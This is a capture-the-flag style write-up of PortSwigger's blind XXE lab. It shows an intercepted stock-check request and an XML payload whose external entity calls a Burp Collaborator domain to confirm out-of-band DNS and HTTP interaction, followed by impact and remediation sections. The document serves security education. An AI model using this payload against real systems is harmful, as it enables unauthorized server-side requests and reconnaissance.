# XXE Injection: Blind XXE with Out-of-Band Interaction

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Blind XML External Entity Injection (CWE-611)

## Lab Objective
The "Check stock" feature parses XML input but never reflects the result back in the response. Detect and confirm the resulting blind XXE vulnerability by forcing the XML parser to issue a DNS lookup and HTTP request to an attacker-controlled Burp Collaborator domain.

## Vulnerability Overview
Every prior lab in this series relied on **in-band** XXE: the application reflected the resolved entity's value somewhere in the response, so the exploit and the proof of success were the same request. Blind XXE removes that feedback loop — the parser still processes the malicious entity server-side, but no visible trace of the result ever reaches the attacker directly.

This doesn't make the vulnerability unexploitable; it changes the exploitation technique from "read the response" to **out-of-band (OOB) interaction**. Because the `SYSTEM` identifier can reference any URI the parser's HTTP client can reach — not just local files — an attacker can point it at infrastructure they control instead. If the server resolves the hostname and makes a request to it, that interaction itself (a DNS lookup, followed by an HTTP request) is proof the XXE fired, even though no data ever came back in the HTTP response the attacker sees directly.

Burp Suite's **Collaborator** is purpose-built for this: it generates a unique, disposable domain, logs every DNS and HTTP interaction made against it, and lets the attacker correlate "I sent this payload" with "and here's proof it executed," entirely out of band from the original request/response cycle.

## Methodology
1. **Identify the XML-consuming feature**, as in prior labs — the "Check stock" request submits raw XML.
2. **Recognize the absence of reflection.** Unlike the first lab in this series, no part of the submitted XML is echoed back, ruling out simple in-band exploitation.
3. **Generate a unique Collaborator payload** via Burp's built-in client — this provides a fresh, attacker-controlled hostname to target.
4. **Inject an external entity pointing at that hostname**, with no need to reference it anywhere in the response, since the goal is just to trigger the outbound request.
5. **Poll the Collaborator client** for interactions, confirming the DNS/HTTP callback actually arrived.

---

## Exploitation

**Step 1:** Add a product to the cart and click "Check stock." Intercept the request in Burp Suite — raw XML, as in earlier labs:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 2:** Send the request to **Repeater**. Confirm the response contains only a normal stock value with no reflection of input — establishing this as a blind scenario before attempting anything further.

**Step 3:** Open **Burp > Collaborator client** (via the Burp menu) and click **Copy to clipboard** to generate a unique Collaborator payload — a domain such as:

```
a1b2c3d4e5f6g7h8i9j0.oastify.com
```

**Step 4:** Replace the request body with a payload defining an external entity pointing at the Collaborator domain. Note the entity doesn't need to be referenced inside any reflected field this time, since no reflection exists to exploit — the mere act of the parser resolving the `DOCTYPE` is sufficient:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://a1b2c3d4e5f6g7h8i9j0.oastify.com/">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Step 5:** Send the request. The application's response looks unremarkable — just the normal stock output — giving no indication anything happened.

**Step 6:** Return to the **Collaborator client** and click **Poll now**. The log now shows one or more interactions: a **DNS** lookup for the generated subdomain, followed by an **HTTP** request to it — both originating from the lab's server.

**Step 7:** The presence of these interactions confirms the parser resolved the malicious `SYSTEM` entity and reached out to external, attacker-controlled infrastructure, which is sufficient to solve the lab.

**Why it works:** The parser's vulnerability (DTD and external entity processing enabled) is identical to the in-band labs — what's different is purely the detection and proof mechanism. Since the application gives no visible feedback, the attacker can't rely on reading a response; instead, they rely on the fact that DNS resolution and the subsequent HTTP request are themselves side effects that occur entirely outside the application's response — on infrastructure designed specifically to observe exactly this kind of blind interaction.

## Impact
- **Confirms exploitability even with zero reflected output** — many real-world XXE vulnerabilities are blind by default, since most applications don't deliberately echo parsed XML fields back to the user; OOB techniques are often the *only* viable detection method in production environments.
- **Proves SSRF capability independent of data exfiltration** — even without extracting data, confirmed OOB interaction demonstrates the server can be forced to make arbitrary outbound requests, which has standalone value for network reconnaissance and further SSRF-style attacks against internal infrastructure.
- **Foundation for further blind XXE escalation** — confirmed blind XXE is typically the first step toward more advanced techniques (parameter entities, malicious external DTDs, error-based exfiltration) covered in the remaining labs of this series, which build on this same OOB channel to actually extract data rather than just confirm the vulnerability exists.

## Remediation
- **Disable DTD processing and external entity resolution** in the XML parser — identical to the fix for in-band XXE, since the underlying misconfiguration is the same; blind XXE is not a distinct vulnerability class requiring a separate fix, only a separate detection method.
- **Restrict outbound network access from the application server** at the network/firewall level, so that even if an XXE/SSRF-capable flaw exists, the server cannot reach arbitrary external (or internal) hosts.
- **Monitor DNS and outbound HTTP logs for anomalous destinations** — unexplained lookups to unfamiliar, randomly-generated domains are a strong indicator of active OOB exploitation attempts and should be alerted on.
- **Treat "no visible reflection" as inconclusive, not safe, during security testing** — this lab is a direct demonstration of why XML-accepting endpoints must always be tested with OOB techniques, not just by checking whether input appears in the response.

## Key Takeaways
- Blind vulnerabilities are not unexploitable vulnerabilities — they require a shift in technique (out-of-band channels) rather than being written off as low-risk due to lack of visible output.
- Burp Collaborator effectively turns "does this request have any observable effect?" into an answerable question for any interaction type that produces network traffic — DNS, HTTP, or SMTP.
- The entity reference doesn't need to be placed inside a reflected output field for a blind OOB attack — simply having it exist within the `DOCTYPE` is enough to trigger resolution, since the parser processes the entity definition regardless of whether its value is ever displayed.
- This lab is the gateway to the more advanced blind XXE techniques later in the learning path — understanding *why* OOB confirmation works here is prerequisite knowledge for the out-of-band data exfiltration labs that follow.

## Tools Used
- Burp Suite (Proxy, Repeater, Collaborator client)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.